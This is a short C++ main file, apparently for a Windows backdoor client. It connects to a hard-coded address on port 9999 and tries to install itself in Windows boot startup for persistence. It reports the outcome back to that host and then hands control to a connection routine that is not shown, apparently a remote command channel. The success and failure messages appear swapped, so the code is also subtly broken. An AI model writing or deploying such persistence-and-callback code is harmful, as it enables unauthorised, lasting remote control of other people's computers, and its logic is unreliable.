#include <iostream>
#include "Connection.h"


int main() {

    ::ShowWindow(::GetConsoleWindow(), SW_SHOW);

    string ip = "192.168.1.210";
    int port = 9999;

    Connection *connection = new Connection(ip, port);
    BOOL success = connection->boot();
    if (success)
        connection->sendMessage("Can't place the exe in the windows boot startup");
    else
        connection->sendMessage("The exe is in windows boot startup");
    connection->connection();
    return 0;
}
